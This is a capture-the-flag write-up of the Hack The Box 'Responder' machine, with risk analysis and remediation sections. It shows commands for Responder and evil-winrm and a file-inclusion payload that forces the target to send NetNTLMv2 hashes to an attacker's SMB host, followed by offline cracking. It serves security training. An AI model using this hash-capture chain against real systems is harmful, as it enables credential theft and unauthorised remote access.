# Hack The Box - Responder

| Property | Value |
|----------|-------|
| **Machine** | Responder |
| **Platform** | Hack The Box |
| **Difficulty** | Very Easy |
| **Target IP** | `10.129.95.234` |

---

## Objective

Responder is a **very easy** Windows machine that demonstrates how a **File Inclusion** vulnerability can be abused to capture **NetNTLMv2** authentication hashes. The objective is to exploit the vulnerable web application, capture and crack the authentication hash, and use the recovered credentials to gain remote access through **WinRM**.

---

## Enumeration

### Nmap Scan

The target was scanned to identify open ports and running services.
<img width="651" height="209" alt="image" src="https://github.com/user-attachments/assets/f95313c0-f66f-4735-b910-5b457572e14f" />

| Port | State | Service | Version |
|------|------|---------|---------|
| 80 | Open | HTTP | Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |
| 5985 | Open | WinRM | Microsoft HTTPAPI httpd 2.0 |

### Analysis

The scan revealed:

- A web application hosted on **port 80**
- **Windows Remote Management (WinRM)** exposed on **port 5985**

The presence of WinRM suggested that valid credentials could potentially provide remote administrative access.

---

## Web Enumeration

Access the web application.

```text
http://<Target-IP>
```

The application redirected to:

```text
http://unika.htb
```

Since the hostname could not be resolved locally, a hosts file entry was added.

```text
echo "<Target-IP> unika.htb" | sudo tee -a /etc/hosts
```

<img width="798" height="434" alt="image" src="https://github.com/user-attachments/assets/1329b543-49e5-47a0-b0da-8e83e33ceed8" />


The browser could now successfully access the virtual host.

---

## Exploitation

### Capturing NetNTLMv2 Authentication

Start **Responder**.

```text
sudo responder -I tun0
```

Responder creates a rogue SMB server that waits for incoming authentication requests.

<img width="558" height="272" alt="image" src="https://github.com/user-attachments/assets/63c7b784-2af0-42b2-a4e4-197363bb31c1" />


The vulnerable **page** parameter was exploited to force the server to authenticate to the attacker's SMB service.

```text
http://unika.htb/?page=//10.10.14.25/somefile
```

<img width="803" height="116" alt="image" src="https://github.com/user-attachments/assets/e7ace297-e238-49fc-a907-e7f5fc7ec078" />


Responder captured the **NetNTLMv2** authentication hash.

<img width="833" height="196" alt="image" src="https://github.com/user-attachments/assets/61498746-564e-4f1e-8517-1e39bf59d4c0" />


---

## Password Cracking

Save the captured hash to a text file.

<img width="832" height="132" alt="image" src="https://github.com/user-attachments/assets/f8baa537-98f0-4f16-98db-75dac16fe723" />


Use **John the Ripper** to perform an offline dictionary attack.

<img width="750" height="164" alt="image" src="https://github.com/user-attachments/assets/3a0e5f27-8722-4d25-8751-a242f53e5600" />


The password for the **Administrator** account was successfully recovered.

---

## Initial Access

### Evil-WinRM

Authenticate to the WinRM service using the recovered credentials.

```text
evil-winrm -i <Target-IP> -u administrator -p badminton
```

<img width="831" height="193" alt="image" src="https://github.com/user-attachments/assets/2ac1d6be-df8e-46f1-9c5b-cfe9ae0bac13" />


A remote PowerShell session was successfully established.

Navigate to the Desktop directory to retrieve the flag.

<img width="476" height="210" alt="image" src="https://github.com/user-attachments/assets/913a2b45-1f4e-42e7-9e39-6363205f7364" />


---

## Risk Analysis

### Finding: File Inclusion Leading to NetNTLMv2 Credential Capture

**Severity:** Critical

**Risk**

The vulnerable **page** parameter allowed the server to authenticate to an attacker-controlled SMB server, exposing **NetNTLMv2** authentication hashes.

**Impact**

- Capture of NTLM authentication material
- Offline password cracking
- Credential compromise
- Unauthorized WinRM access
- Remote command execution
- Unauthorized access to sensitive files

**Remediation**

- Validate and sanitize all user-controlled file paths.
- Prevent processing of external UNC paths.
- Block unnecessary outbound SMB traffic.
- Enforce strong password policies.
- Restrict WinRM access to trusted administrative hosts.
- Reduce or disable NTLM authentication where operationally possible.

---

## Root Cause

The web application failed to properly validate user input supplied to the **page** parameter, allowing arbitrary external UNC paths to be processed. This caused the Windows server to initiate SMB authentication to an attacker-controlled host, exposing **NetNTLMv2** credentials. The impact was further increased by the use of a weak password that could be cracked offline.

---

## Evidence

Successful exploitation was confirmed by:

- Nmap identified HTTP and WinRM services.
- The vulnerable **page** parameter triggered outbound SMB authentication.
- Responder captured the NetNTLMv2 hash.
- John the Ripper successfully recovered the password.
- Evil-WinRM authenticated successfully using the recovered credentials.
- A remote PowerShell session was established.
- The target filesystem and **flag.txt** were successfully accessed.

---

## Conclusion

The **Responder** machine demonstrates how a seemingly simple **File Inclusion** vulnerability can expose Windows authentication mechanisms. By forcing the server to authenticate to a malicious SMB service, **NetNTLMv2** credentials were captured and cracked offline. The recovered credentials provided access through **WinRM**, resulting in successful remote compromise of the target system. This machine highlights the importance of validating user input, restricting outbound SMB communication, enforcing strong passwords, and limiting remote administrative access.
